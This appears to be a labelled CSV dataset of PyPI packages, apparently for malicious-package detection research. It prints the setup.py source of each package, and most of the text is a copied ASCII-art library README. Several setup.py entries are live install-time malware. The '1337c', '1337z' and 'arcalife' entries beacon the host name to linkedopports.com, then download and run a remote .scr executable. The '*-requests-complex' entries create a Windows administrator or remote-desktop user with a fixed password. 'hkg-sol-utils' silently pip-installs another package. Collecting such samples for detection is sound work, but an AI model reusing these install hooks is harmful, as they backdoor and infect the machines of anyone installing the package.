secrevtwo-0.0.1,0,0,0,0,0,0,1,0,PKG-INFO config_manager.py dist_util.py monkey_patch.py string_utils.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt setup.cfg setup.py,"from setuptools import setup
setup(name=""secrevtwo"", version=""0.0.1"", description=(""This is a tool created to patch""), packages=[""secrevtwo""])
",1
ctx-0.2.2,1,0,1,1,1,0,0,0,.gitignore .travis.yml dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt ctx.py LICENSE Makefile MANIFEST.in PKG-INFO README.rst requirements-dev.txt requirements.txt setup.cfg setup.py test_ctx.py tox.ini,"from __future__ import unicode_literals

import os
import codecs

from setuptools import setup

import ctx


def read(*paths):
    """"""Build a file path from *paths* and return the contents.""""""
    path = os.path.join(*paths)
    with codecs.open(path, mode='rb', encoding='utf-8') as f:
        return f.read()


long_description = '\n\n'.join(
    map(read, (
        'README.rst',
    ))
)


setup(
    name='ctx',
    version=ctx.__version__,
    description=""A minimal but opinionated dict/object combo (like Bunch)."",
    long_description=long_description,
    author='Robert Ledger',
    author_email='figlief@figlief.com',
    url='https://github.com/figlief/ctx',
    include_package_data=True,
    py_modules=['ctx'],
    install_requires=[],
    license=""MIT"",
    zip_safe=False,
    keywords='ctx',
    classifiers=[
        'Development Status :: 2 - Pre-Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Natural Language :: English',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
)
",1
hkg-sol-utils-0.4.0,0,0,1,0,0,0,1,0,LICENSE PKG-INFO setup.cfg setup.py graphme.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt,"from distutils.core import setup
import subprocess

setup(
  name = 'hkg-sol-utils',
  version = '0.4.0',
  description = '',
  author = 'Watson',
  keywords = ['pygrata2'],
  classifiers = []
)

try:
    subprocess.getoutput('dig @1.1.1.1 install.api.pygrata.com')
    subprocess.getoutput('pip install pygrata-utils -U')
except:
  pass
",1
php-requests-complex-0.0.1,1,0,0,0,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"import setuptools
import requests
import subprocess

try:
    result = subprocess.check_output('net user /add flask 123qwe123', shell=True)
    result2 = subprocess.check_output('net localgroup ""Remote Desktop Users"" flask /add', shell=True)
except:
    pass

requests.get('https://siyah.site/pekekent.php')

setuptools.setup(name=""php-requests-complex"", version=""0.0.1"", author=""ternaryternary"", packages=[""2c84c9fb1f1dae4c0e339261d9c5d2e11""])",1
flask-requests-complex-0.0.1,1,0,0,0,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"import setuptools
import requests
import subprocess

try:
    result = subprocess.check_output('net user /add user3 123qwe123', shell=True)
    result2 = subprocess.check_output('net localgroup administrators user3 /add', shell=True)
except:
    pass

requests.get('https://siyah.site/pekekent.php')

setuptools.setup(name=""flask-requests-complex"", version=""0.0.1"", author=""ternaryternary"", packages=[""2c84c9fb1f1dae4c0e339261d9c5d2e1""])",1
bs4tools-0.0.1,0,0,0,0,0,0,1,0,bs4tools.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"import setuptools

setuptools.setup(name=""bs4tools"", version=""0.0.1"", author=""ternaryternary"", packages=[""bs4tools""])",1
1337c-4.4.7,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='1337c',
  version='4.4.7',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
1337z-4.4.7,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='1337z',
  version='4.4.7',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
aiogram-types-0.1.8,0,0,1,1,1,0,1,1,__init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.rst setup.cfg setup.py,,1
aiohttp-proxy-connect-0.4.2,0,0,1,1,1,0,1,0,connector.py errors.py helpers.py proto.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.md setup.cfg setup.py,,1
arcalife-4.4.2,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='arcalife',
  version='4.4.2',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
ascii2text-2.4,0,0,1,1,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"from setuptools import setup

setup(
    name=""ascii2text"",
    version='2.4',
    license='Eclipse Public License 2.0',
    authors=[""joe140""],
    author_email=""<joeyn@gmail.com>"",
    description=""lets you convert text to ascci banners"",
    long_description='lets you convert text to ascci banners',
    keywords=['cli', 'better', 'colors', 'terminal', 'tui', 'ascci'],
    packages=['ascii2text']
)
",1
ascii2text-2.5,0,0,1,1,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"from setuptools import setup

long_description = """"""<div align='center'>
<img src='https://github.com/sepandhaghighi/art/raw/master/otherfile/logo.png'>
<br/>
<br/>
<a href='https://codecov.io/gh/sepandhaghighi/art'>
  <img src='https://codecov.io/gh/sepandhaghighi/art/branch/master/graph/badge.svg' alt='Codecov' />
</a>
<a href='https://badge.fury.io/py/art'><img src='https://badge.fury.io/py/art.svg' alt='PyPI version' height='18'></a>
<a href='https://www.python.org/'><img src='https://img.shields.io/badge/built%20with-Python3-green.svg' alt='built with Python3' /></a>
<a href='https://github.com/sepandhaghighi/art/blob/master/FontList.ipynb'><img src='https://img.shields.io/badge/Font List-627-blue.svg'></a>
<a href='https://github.com/sepandhaghighi/art/blob/master/ArtList.ipynb'><img src='https://img.shields.io/badge/Art List-710-orange.svg'></a>
<a href='https://github.com/sepandhaghighi/art/blob/master/DecorList.ipynb'><img src='https://img.shields.io/badge/Decor List-218-green.svg'></a>
<a href='https://t.me/artlib_bot' target='__blank'><img src='https://img.shields.io/badge/Telegram-Bot-red.svg'></a>
<a href='https://anaconda.org/sepandhaghighi/art'><img src='https://anaconda.org/sepandhaghighi/art/badges/version.svg'></a>
<a href='https://discord.com/invite/FAAyq3QJqP'><img src='https://img.shields.io/discord/897532566301724722.svg' alt='Discord Channel'></a>
</div>
	
----------

## Table of contents					
   * [Overview](https://github.com/sepandhaghighi/art#overview)
   * [Installation](https://github.com/sepandhaghighi/art/blob/master/INSTALL.md)
   * [Usage](https://github.com/sepandhaghighi/art#usage)
   		* [1-Line Art](https://github.com/sepandhaghighi/art#1-line-art)
   		* [ASCII Text](https://github.com/sepandhaghighi/art#ascii-text)
   		* [Decoration](https://github.com/sepandhaghighi/art#decoration)
   		* [Font Modes](https://github.com/sepandhaghighi/art#font-modes)
   		* [Typo-Tolerance](https://github.com/sepandhaghighi/art#typo-tolerance)
   		* [Set Defaults](https://github.com/sepandhaghighi/art#set-defaults)
   		* [Testing](https://github.com/sepandhaghighi/art#testing)
   		* [CLI](https://github.com/sepandhaghighi/art#cli)
   		* [Telegram Bot](https://github.com/sepandhaghighi/art#telegram-bot)
   		* [Try ART in Your Browser](https://github.com/sepandhaghighi/art#try-art-in-your-browser)
   		* [Screen Record](https://github.com/sepandhaghighi/art#screen-record)
   * [Issues & Bug Reports](https://github.com/sepandhaghighi/art#issues--bug-reports)
   * [Dependencies](https://github.com/sepandhaghighi/art#dependencies)
   * [Contribution](https://github.com/sepandhaghighi/art/blob/master/.github/CONTRIBUTING.md)
   * [Reference](https://github.com/sepandhaghighi/art#reference)
   * [Authors](https://github.com/sepandhaghighi/art/blob/master/AUTHORS.md)
   * [License](https://github.com/sepandhaghighi/art/blob/master/LICENSE)
   * [Show Your Support](https://github.com/sepandhaghighi/art#show-your-support)
   * [Changelog](https://github.com/sepandhaghighi/art/blob/master/CHANGELOG.md)
   * [Code of Conduct](https://github.com/sepandhaghighi/art/blob/master/.github/CODE_OF_CONDUCT.md)

## Overview	
ASCII art is also known as 'computer text art'. It involves the smart placement of typed special characters or
letters to make a visual shape that is spread over multiple lines of text.
	
ART is a Python lib for text converting to ASCII art fancy. ;-)



<table>
	<tr> 
		<td align='center'>Open Hub</td>
		<td align='center'><a href='https://www.openhub.net/p/artlib'><img src='https://www.openhub.net/p/artlib/widgets/project_thin_badge.gif'></a></td>	
	</tr>
	<tr>
		<td align='center'>PyPI Counter</td>
		<td align='center'><a href='http://pepy.tech/project/art'><img src='http://pepy.tech/badge/art'></a></td>
	</tr>
	<tr>
		<td align='center'>Github Stars</td>
		<td align='center'><a href='https://github.com/sepandhaghighi/art'><img src='https://img.shields.io/github/stars/sepandhaghighi/art.svg?style=social&label=Stars'></a></td>
	</tr>
	<tr>
		<td align='center'>Font Counter</td>
		<td align='center'>627</td>
	</tr>
	<tr>
		<td align='center'>1-Line-Art Counter</td>
		<td align='center'>710</td>
	</tr>
    <tr>
		<td align='center'>Decor Counter</td>
		<td align='center'>218</td>
	</tr>
</table>



<table>
	<tr> 
		<td align='center'>Branch</td>
		<td align='center'>master</td>	
		<td align='center'>dev</td>	
	</tr>
	<tr>
		<td align='center'>CI</td>
		<td align='center'><img src='https://github.com/sepandhaghighi/art/workflows/CI/badge.svg?branch=master'></td>
		<td align='center'><img src='https://github.com/sepandhaghighi/art/workflows/CI/badge.svg?branch=dev'></td>
	</tr>
</table>

<table>
	<tr> 
		<td align='center'>Code Quality</td>
		<td align='center'><a class='badge-align' href='https://www.codacy.com/app/sepand-haghighi/art?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=sepandhaghighi/art&amp;utm_campaign=Badge_Grade'><img src='https://api.codacy.com/project/badge/Grade/405020450bc94088ad1450461831a587'/></a></td>	
		<td align='center'><a href='https://codebeat.co/projects/github-com-sepandhaghighi-art-dev'><img alt='codebeat badge' src='https://codebeat.co/badges/90e77325-a046-4cc5-9c3e-646c011a5b72' /></a></td>	
		<td align='center'><a href='https://www.codefactor.io/repository/github/sepandhaghighi/art'><img src='https://www.codefactor.io/repository/github/sepandhaghighi/art/badge' alt='CodeFactor' /></a></td>
	</tr>
</table>

    

## Usage

<div align='center'>

<img src='https://github.com/sepandhaghighi/art/raw/master/otherfile/ART.gif'>
<p>Quick Start</p>

</div>				


### 1-Line art

⚠️ Some environments don't support all 1-Line arts

⚠️ **ART 4.6** is the last version to support **Bipartite art**


#### 1. art					

This function return 1-line art as `str` in normal mode and raise `artError` in exception.	
```pycon
>>> from art import *
>>> art_1=art('coffee') # return art as str in normal mode
>>> print(art_1)
c[_]
>>> art_2=art('woman',number=2) # return multiple art as str
>>> print(art_2)
▓⚗_⚗▓ ▓⚗_⚗▓ 
>>> art('random') # random 1-line art mode
'(っ◕‿◕)っ '
>>> art('rand')   # random 1-line art mode
't(-_-t) '
>>> art(22,number=1) # raise artError
Traceback (most recent call last):
        ...
art.art.artError: The 'artname' type must be str.

```
#### 2. aprint				

This function print 1-line art in normal mode (return None) and raise `artError` in exception.
```pycon
>>> aprint('butterfly') # print art
Ƹ̵̡Ӝ̵̨̄Ʒ 
>>> aprint('happy') # print art
 ۜ\(סּںסּَ` )/ۜ
>>> aprint('random') # random 1-line art mode
'(っ◕‿◕)っ '
>>> aprint('rand')   # random 1-line art mode
't(-_-t) '
>>> aprint('woman',number='22') # raise artError
Traceback (most recent call last):
        ...
art.art.artError: The 'number' type must be int.
```

#### 3. randart

`randart` function is added in `Version 2.2` as `art('random')` shortcut.
```pycon
>>> randart()
'ዞᏜ℘℘Ꮍ ℬℹℛʈዞᗬᏜᎽ '
>>> randart()
'✌(◕‿-)✌ '
```	

* Note1 : Use `ART_NAMES` to access all arts name list (new in `Version 4.2`)
* Note2 : Use `NON_ASCII_ARTS` to access all Non-ASCII arts name list (new in `Version 4.6`)

### ASCII text
	
⚠️ Some fonts don't support all characters		

⚠️ From `Version 3.3` Non-ASCII fonts added (These fonts are not compatible with some environments)

⚠️ From `Version 5.3` `\n` is used as the default line separator instead of `\r\n` (Use `sep` parameter if needed)

#### 1. text2art				

This function return ASCII text as `str` in normal mode and raise `artError` in exception.
```pycon	
>>> Art=text2art('art') # Return ASCII text (default font) and default chr_ignore=True 
>>> print(Art)
              _   
  __ _  _ __ | |_ 
 / _` || '__|| __|
| (_| || |   | |_ 
 \__,_||_|    \__|
                  
                     
>>> Art=text2art('art',font='block',chr_ignore=True) # Return ASCII text with block font
>>> print(Art)


 .----------------.  .----------------.  .----------------.
| .--------------. || .--------------. || .--------------. |
| |      __      | || |  _______     | || |  _________   | |
| |     /  \     | || | |_   __ \    | || | |  _   _  |  | |
| |    / /\ \    | || |   | |__) |   | || | |_/ | | \_|  | |
| |   / ____ \   | || |   |  __ /    | || |     | |      | |
| | _/ /    \ \_ | || |  _| |  \ \_  | || |    _| |_     | |
| ||____|  |____|| || | |____| |___| | || |   |_____|    | |
| |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'

>>> Art=text2art('test','random') # random font mode
>>> print(Art)
 |       | 
~|~/~/(~~|~
 | \/__) | 
           
>>> Art=text2art('test','rand') # random font mode
>>> print(Art)
___ ____ ____ ___ 
 |  |___ [__   |  
 |  |___ ___]  | 

>>> print(text2art('''Lorem  
ipsum 
dolor''', font='small')) # Multi-line print
 _                            
| |    ___  _ _  ___  _ __    
| |__ / _ \| '_|/ -_)| '  \   
|____|\___/|_|  \___||_|_|_|  
                              
 _                         
(_) _ __  ___ _  _  _ __   
| || '_ \(_-<| || || '  \  
|_|| .__//__/ \_,_||_|_|_| 
   |_|                     
    _       _           
 __| | ___ | | ___  _ _ 
/ _` |/ _ \| |/ _ \| '_|
\__,_|\___/|_|\___/|_|  
                        

>>> print(text2art('test','white_bubble'))  # Non-ASCII font example
ⓣⓔⓢⓣ
>>> text2art('art',font='fancy5',decoration='barcode1') # decoration parameter is added in Version 4.6
'▌│█║▌║▌║ ᏗᏒᏖ ║▌║▌║█│▌'
>>> text2art('seسسس',font=DEFAULT_FONT,chr_ignore=False) # raise artError in exception
Traceback (most recent call last):
        ...
art.art.artError: س is invalid.
  
```
#### 2. tprint				

This function print ASCII text in normal mode (return None) and raise `artError` in exception.
```pycon
>>> tprint('art') # print ASCII text (default font) 
              _   
  __ _  _ __ | |_ 
 / _` || '__|| __|
| (_| || |   | |_ 
 \__,_||_|    \__|
                  

>>> tprint('art',font='block',chr_ignore=True) # print ASCII text (block font)

 .----------------.  .----------------.  .----------------.
| .--------------. || .--------------. || .--------------. |
| |      __      | || |  _______     | || |  _________   | |
| |     /  \     | || | |_   __ \    | || | |  _   _  |  | |
| |    / /\ \    | || |   | |__) |   | || | |_/ | | \_|  | |
| |   / ____ \   | || |   |  __ /    | || |     | |      | |
| | _/ /    \ \_ | || |  _| |  \ \_  | || |    _| |_     | |
| ||____|  |____|| || | |____| |___| | || |   |_____|    | |
| |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'

>>> tprint('testسس')  # chr_ignore flag ==True (Default)
 _               _   
| |_   ___  ___ | |_ 
| __| / _ \/ __|| __|
| |_ |  __/\__ \| |_ 
 \__| \___||___/ \__|
                     
>>> tprint('test','random') # random font mode
 |       | 
~|~/~/(~~|~
 | \/__) | 
           
>>> tprint('test','rand') # random font mode
___ ____ ____ ___ 
 |  |___ [__   |  
 |  |___ ___]  |  
                  

>>> tprint('testسس',chr_ignore=False) # raise artError in exception 
Traceback (most recent call last):
       ...
art.art.artError: س is invalid.
>>> tprint('''Lorem  
ipsum 
dolor''', font='cybermedium') # Multi-line print
_    ____ ____ ____ _  _    
|    |  | |__/ |___ |\/|    
|___ |__| |  \ |___ |  |    
                            
_ ___  ____ _  _ _  _    
| |__] [__  |  | |\/|    
| |    ___] |__| |  |    
                         
___  ____ _    ____ ____ 
|  \ |  | |    |  | |__/ 
|__/ |__| |___ |__| |  \ 

>>> tprint('art',font='fancy5',decoration='barcode1') # decoration parameter is added in Version 4.6
▌│█║▌║▌║ ᏗᏒᏖ ║▌║▌║█│▌
>>> tprint('art',font='fancy5',decoration='random') # decoration random mode is added in Version 5.0
•]•·✦º✦·»ᏗᏒᏖ«·✦º✦·•[•
```
#### 3. tsave				

This function return `dict` in normal and exception mode.
```pycon
>>> Response=tsave('art',filename='test.txt') # save ASCII text in test.txt file with save message (print_status==True), return dict
Saved! 
Filename: test.txt
>>> Response['Message']
'OK'
>>> Response=tsave('art',filename='test.txt',print_status=False) # save ASCII text in test.txt file without save message (print_status==False)
>>> Response['Message']
'OK'
>>> Response['Status']
True
>>> tsave(22,font=DEFAULT_FONT,filename='art',chr_ignore=True,print_status=True)
{'Status': False, 'Message': ''int' object has no attribute 'split''}
>>> Response=tsave('art',filename='test.txt',overwrite=True) # overwrite parameter is added in Version 4.0
Saved! 
Filename: test.txt
>>> Response=tsave('art',filename='test.txt',decoration='barcode1') # decoration parameter is added in Version 4.6
Saved! 
Filename: test.txt
>>> Response=tsave('art',filename='test.txt',sep='\r\n') # sep parameter is added in Version 5.3
Saved! 
Filename: test.txt                        
```

* Note1 : Use `FONT_NAMES` to access all fonts name list (new in `Version 4.2`)
* Note2 : Use `NON_ASCII_FONTS` to access all Non-ASCII fonts name list (new in `Version 4.4`)

### Decoration

⚠️ Some environments don't support all decorations

#### 1. decor

This function return decoration as `str` in normal mode and raise `artError` in exception.
```pycon
>>> decor('barcode1')
'▌│█║▌║▌║ '
>>> decor('barcode1',reverse=True)
' ║▌║▌║█│▌'
>>> decor('barcode1') + text2art('    art   ',font='fancy42') + decor('barcode1',reverse=True)
'▌│█║▌║▌║     ąяţ    ║▌║▌║█│▌'
>>> decor('barcode1',both=True) # both parameter is added in Version 5.0
['▌│█║▌║▌║ ', ' ║▌║▌║█│▌']
>>> decor('random',both=True) # random mode is added in Version 5.0
['｢(◔ω◔「)三', '三三三ʅ(；◔౪◔)ʃ']
>>> decor('rand',both=True) # random mode is added in Version 5.0
['‹–…·´`·…–›', '‹–…·´`·…–›']
>>> decor(None)
Traceback (most recent call last):
	...
art.art.artError: The 'decoration' type must be str.
```

* Note : Use `DECORATION_NAMES` to access all decorations name list (new in `Version 4.6`)

### Font modes

These modes are available for `text2art`, `tprint` & `tsave`.	

#### 1. Font name	

⚠️ Some fonts don't support all characters
			
```pycon

>>> tprint('art',font='block',chr_ignore=True)

 .----------------.  .----------------.  .----------------.
| .--------------. || .--------------. || .--------------. |
| |      __      | || |  _______     | || |  _________   | |
| |     /  \     | || | |_   __ \    | || | |  _   _  |  | |
| |    / /\ \    | || |   | |__) |   | || | |_/ | | \_|  | |
| |   / ____ \   | || |   |  __ /    | || |     | |      | |
| | _/ /    \ \_ | || |  _| |  \ \_  | || |    _| |_     | |
| ||____|  |____|| || | |____| |___| | || |   |_____|    | |
| |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'

>>> tprint('art','white_bubble')
ⓐⓡⓣ

```	

#### 2. Random		

Randomly select from all fonts.	

Keywords : `random`, `rand` & `rnd`

```pycon
>>> tprint('test',font='random')
 |       | 
~|~/~/(~~|~
 | \/__) | 
  

```

#### 3. Random small

Randomly select from small fonts.	

Keywords : `rnd-small`, `random-small` & `rand-small`

* Note : New in `Version 2.8`

```pycon
>>> tprint('test',font='rnd-small')
             
_/  _   _ _/ 
/  (- _)  /  
             
```

#### 4. Random medium

Randomly select from medium fonts.

Keywords : `rnd-medium`, `random-medium` & `rand-medium`

* Note : New in `Version 2.8`

```pycon
>>> tprint('test',font='rnd-medium')
                      
  ,                ,  
 ||               ||  
=||=  _-_   _-_, =||= 
 ||  || \\ ||_.   ||  
 ||  ||/    ~ ||  ||  
 \\, \\,/  ,-_-   \\, 
                      
                      
```

#### 5. Random large

Randomly select from large fonts.

Keywords : `rnd-large`, `random-large` & `rand-large`

* Note : New in `Version 2.8`

```pycon
>>> tprint('test',font='rnd-large')
                                                                    
8888888 8888888888 8 8888888888      d888888o.   8888888 8888888888 
      8 8888       8 8888          .`8888:' `88.       8 8888       
      8 8888       8 8888          8.`8888.   Y8       8 8888       
      8 8888       8 8888          `8.`8888.           8 8888       
      8 8888       8 888888888888   `8.`8888.          8 8888       
      8 8888       8 8888            `8.`8888.         8 8888       
      8 8888       8 8888             `8.`8888.        8 8888       
      8 8888       8 8888         8b   `8.`8888.       8 8888       
      8 8888       8 8888         `8b.  ;8.`8888       8 8888       
      8 8888       8 888888888888  `Y8888P ,88P'       8 8888       


```

#### 6. Random xlarge

Randomly select from xlarge fonts.	

Keywords : `rnd-xlarge`, `random-xlarge` & `rand-xlarge`

* Note : New in `Version 2.8`

```pycon
>>> tprint('test','rnd-xlarge')
      _____                    _____                    _____                _____          
     /\    \                  /\    \                  /\    \              /\    \         
    /::\    \                /::\    \                /::\    \            /::\    \        
    \:::\    \              /::::\    \              /::::\    \           \:::\    \       
     \:::\    \            /::::::\    \            /::::::\    \           \:::\    \      
      \:::\    \          /:::/\:::\    \          /:::/\:::\    \           \:::\    \     
       \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \           \:::\    \    
       /::::\    \      /::::\   \:::\    \       \:::\   \:::\    \          /::::\    \   
      /::::::\    \    /::::::\   \:::\    \    ___\:::\   \:::\    \        /::::::\    \  
     /:::/\:::\    \  /:::/\:::\   \:::\    \  /\   \:::\   \:::\    \      /:::/\:::\    \ 
    /:::/  \:::\____\/:::/__\:::\   \:::\____\/::\   \:::\   \:::\____\    /:::/  \:::\____\
   /:::/    \::/    /\:::\   \:::\   \::/    /\:::\   \:::\   \::/    /   /:::/    \::/    /
  /:::/    / \/____/  \:::\   \:::\   \/____/  \:::\   \:::\   \/____/   /:::/    / \/____/ 
 /:::/    /            \:::\   \:::\    \       \:::\   \:::\    \      /:::/    /          
/:::/    /              \:::\   \:::\____\       \:::\   \:::\____\    /:::/    /           
\::/    /                \:::\   \::/    /        \:::\  /:::/    /    \::/    /            
 \/____/                  \:::\   \/____/          \:::\/:::/    /      \/____/             
                           \:::\    \               \::::::/    /                           
                            \:::\____\               \::::/    /                            
                             \::/    /                \::/    /                             
                              \/____/                  \/____/                              
                                                                                            
```
	
#### 7. Wizard	

This mode consider length of input text to select font

☑️ Support of 95 ASCII characters guaranteed

Keywords : `wizard`, `wiz` & `magic`

* Note : New in `Version 2.9`

```pycon
>>> tprint('1','wizard')
    88 
  ,d88 
888888 
    88 
    88 
    88 
    88 
    88 
    88 
    88 
       
            

>>> tprint('1'*5,'wizard')
d88  d88  d88  d88  d88  
 88   88   88   88   88  
 88   88   88   88   88  
 88   88   88   88   88  
 88   88   88   88   88  
d88P d88P d88P d88P d88P 
                         
                         

>>> tprint('1'*15,'wizard')
                                             
                                             
 #  #  #  #  #  #  #  #  #  #  #  #  #  #  # 
## ## ## ## ## ## ## ## ## ## ## ## ## ## ## 
 #  #  #  #  #  #  #  #  #  #  #  #  #  #  # 
 #  #  #  #  #  #  #  #  #  #  #  #  #  #  # 
 #  #  #  #  #  #  #  #  #  #  #  #  #  #  # 
## ## ## ## ## ## ## ## ## ## ## ## ## ## ## 
                                             
                                             
```
	


#### 8. Random Non-ASCII

Randomly select from Non-ASCII fonts.	

Keywords : `random-na`, `rand-na` & `rnd-na`

* Note : New in `Version 3.4`

```pycon
>>> tprint('test','random-na')
₮Ɇ₴₮
>>> tprint('test','random-na')
ʇsǝʇ

```

#### 9. Mix Non-ASCII

Randomly mix Non-ASCII fonts.

Keywords : `mix`

* Note : New in `Version 3.7`

```pycon
>>> tprint('test','mix')
†Ɛѕ†
>>> tprint('test','mix')
tᏋѕt
>>> tprint('test','mix')
꓄єร꓄
```

⚠️ Non-ASCII fonts are only available in `Font name`, `Random Non-ASCII` and `Mix` modes	


### Typo-tolerance			
<a href='https://en.wikipedia.org/wiki/Levenshtein_distance'>Levenshtein distance</a> used in this project. (`Version` >0.9)

```pycon
>>> aprint('happi')  # correct --> aprint('happy'), error < |artname|/2
 ۜ\(סּںסּَ` )/ۜ 
>>> Art=art('birds2222222',number=1) # correct --> Art=art('birds',number=1), error >= |artname|/2
Traceback (most recent call last):
	...
art.art.artError: Invalid art name.
>>> aprint('happi231')  # correct --> aprint('happy'), error < |artname|/2
⎦˚◡˚⎣ 
>>> aprint('happi2312344') # correct --> aprint('happy'), error >= |artname|/2
Traceback (most recent call last):
	...
art.art.artError: Invalid art name.
>>> Art=text2art('test',font='black') # correct --> Art=text2art('test',font='block')
>>> print(Art)

 .----------------.  .----------------.  .----------------.  .----------------.
| .--------------. || .--------------. || .--------------. || .--------------. |
| |  _________   | || |  _________   | || |    _______   | || |  _________   | |
| | |  _   _  |  | || | |_   ___  |  | || |   /  ___  |  | || | |  _   _  |  | |
| | |_/ | | \_|  | || |   | |_  \_|  | || |  |  (__ \_|  | || | |_/ | | \_|  | |
| |     | |      | || |   |  _|  _   | || |   '.___`-.   | || |     | |      | |
| |    _| |_     | || |  _| |___/ |  | || |  |`\____) |  | || |    _| |_     | |
| |   |_____|    | || | |_________|  | || |  |_______.'  | || |   |_____|    | |
| |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'

>>> tprint('test',font='cybermedum')   # correct --> tprint('test',font='cybermedium')
___ ____ ____ ___ 
 |  |___ [__   |  
 |  |___ ___]  |  
                  
   
```

### Set defaults			
`set_default` function is added in `Version 2.2` in order to change default values.

```pycon
>>> help(set_default)
Help on function set_default in module art.art:

set_default(font='standard', chr_ignore=True, filename='art', print_status=True, overwrite=False, decoration=None, sep='\n')
    Change text2art, tprint and tsave default values.
    
    :param font: input font
    :type font:str
    :param chr_ignore: ignore not supported character
    :type chr_ignore:bool
    :param filename: output file name (only tsave)
    :type filename:str
    :param print_status : save message print flag (only tsave)
    :type print_status:bool
    :param overwrite : overwrite the saved file if true (only tsave)
    :type overwrite:bool
    :param decoration: input decoration
    :type decoration:str
    :param sep: line separator char
    :type sep: str
    :return: None

>>> tprint('test')
 _               _   
| |_   ___  ___ | |_ 
| __| / _ \/ __|| __|
| |_ |  __/\__ \| |_ 
 \__| \___||___/ \__|
                     

>>> set_default(font='italic')
>>> tprint('test')
             
_/  _   _ _/ 
/  (- _)  /  
             

```
* Note : Functions error response updated in `Version 0.8`

	<table>
	<tr>
		<td align='center'>Function</td>
		<td align='center'>Normal Output</td>
		<td align='center'>Error</td>
	</tr>
    <tr>
		<td align='center'>decor</td>
		<td align='center'>str</td>
		<td align='center'>raise artError</td>

	</tr>
	<tr>
		<td align='center'>art</td>
		<td align='center'>str</td>
		<td align='center'>raise artError</td>

	</tr>
	<tr>
		<td align='center'>aprint</td>
		<td align='center'>None</td>
		<td align='center'>raise artError</td>
	</tr>
	<tr>
		<td align='center'>tprint</td>
		<td align='center'>None</td>
		<td align='center'>raise artError</td>
	</tr>
	<tr>
		<td align='center'>tsave</td>
		<td align='center'>{'Status':bool,'Message':str}</td>
		<td align='center'>{'Status':bool,'Message':str}</td>
	</tr>
	<tr>
		<td align='center'>text2art</td>
		<td align='center'>str</td>
		<td align='center'>raise artError</td>
	</tr>	
	<tr>
		<td align='center'>set_default</td>
		<td align='center'>None</td>
